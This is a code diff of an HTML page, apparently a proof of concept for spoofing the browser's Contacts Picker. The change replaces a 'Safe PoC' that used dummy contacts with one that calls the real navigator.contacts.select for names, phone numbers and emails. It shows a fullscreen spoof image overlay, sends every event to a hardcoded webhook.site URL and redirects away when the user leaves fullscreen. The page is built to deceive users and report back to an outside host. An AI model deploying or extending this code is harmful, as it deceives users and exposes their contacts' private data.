@@ -1,58 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Contacts Picker Demo (Safe PoC)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta charset="utf-8">
+<title>Contacts Picker PoC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      background: #000;
-      font-family: sans-serif;
-      color: #fff;
-    }
-
-    #spoof {
-      position: fixed;
-      inset: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      display: none;
-      z-index: 9999;
-    }
-
-    #content {
-      height: 100%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 20px;
-    }
-
-    button {
-      padding: 16px 24px;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      background: #1a73e8;
-      color: #fff;
-    }
-  </style>
+<style>
+html,body{
+  margin:0;
+  padding:0;
+  width:100%;
+  height:100%;
+  background:#000;
+  color:#fff;
+  font-family:sans-serif;
+}
+#spoof{
+  position:fixed;
+  inset:0;
+  width:100vw;
+  height:100vh;
+  object-fit:cover;
+  display:none;
+  z-index:9999;
+}
+#content{
+  height:100%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+}
+button{
+  padding:16px 24px;
+  font-size:18px;
+  background:#1a73e8;
+  color:#fff;
+  border:none;
+  border-radius:8px;
+}
+</style>
 </head>
 
 <body>
 
-<img id="spoof" src="spof2.png" alt="spoof">
-
+<img id="spoof" src="spof2.png">
 <div id="content">
   <div>
-    <h1>Click anywhere to start demo</h1>
+    <h1>Click to open Contacts</h1>
     <button id="start">Open Contacts</button>
   </div>
 </div>
@@ -60,62 +55,64 @@
 <script>
 const WEBHOOK = "https://webhook.site/c28e63ae-558e-47e6-84d1-3ca7c07cacc4";
 
-function sendToWebhook(data) {
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
-  }).catch(() => {});
-}
-
-function dummyContacts() {
-  return [
-    { name: "John Doe", phone: "+628123456789" },
-    { name: "Jane Doe", phone: "+628987654321" }
-  ];
+function send(data){
+  fetch(WEBHOOK,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify(data)
+  }).catch(()=>{});
 }
 
 document.getElementById("start").addEventListener("click", async () => {
 
-  // 1️⃣ Simulate contacts picker opened
-  sendToWebhook({
-    event: "contacts_picker_opened",
-    time: new Date().toISOString()
-  });
+  // log: click
+  send({ event:"click", time:new Date().toISOString() });
 
-  // 2️⃣ Show spoof overlay
-  document.getElementById("spoof").style.display = "block";
-  document.getElementById("content").style.display = "none";
+  // show overlay
+  document.getElementById("spoof").style.display="block";
+  document.getElementById("content").style.display="none";
 
-  // 3️⃣ Request fullscreen (if allowed)
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen().catch(() => {});
+  // fullscreen
+  if(document.documentElement.requestFullscreen){
+    document.documentElement.requestFullscreen().catch(()=>{});
   }
 
-  // 4️⃣ Simulate user selecting contacts
-  setTimeout(() => {
-    const contacts = dummyContacts();
+  // contacts picker
+  if(navigator.contacts && navigator.contacts.select){
+    send({ event:"contacts_picker_opened", time:new Date().toISOString() });
 
-    sendToWebhook({
-      event: "contacts_selected",
-      contacts,
-      time: new Date().toISOString()
+    try{
+      const contacts = await navigator.contacts.select(
+        ["name","tel","email"],
+        { multiple:true }
+      );
+
+      send({
+        event:"contacts_picker_success",
+        count: contacts.length,
+        time: new Date().toISOString()
+      });
+
+    }catch(e){
+      send({
+        event:"contacts_picker_closed",
+        error: e.name,
+        time: new Date().toISOString()
+      });
+    }
+  }else{
+    send({
+      event:"contacts_api_not_supported",
+      time:new Date().toISOString()
     });
-  }, 1200);
+  }
 });
 
-// 5️⃣ Detect exit fullscreen → redirect fast
-document.addEventListener("fullscreenchange", () => {
-  if (!document.fullscreenElement) {
-    sendToWebhook({
-      event: "exit_fullscreen",
-      time: new Date().toISOString()
-    });
-
-    // redirect cepat
-    setTimeout(() => {
-      location.href = "https://google.com";
-    }, 50);
+// exit fullscreen → redirect cepat
+document.addEventListener("fullscreenchange",()=>{
+  if(!document.fullscreenElement){
+    send({ event:"exit_fullscreen", time:new Date().toISOString() });
+    setTimeout(()=>location.href="https://google.com",50);
   }
 });
 </script>
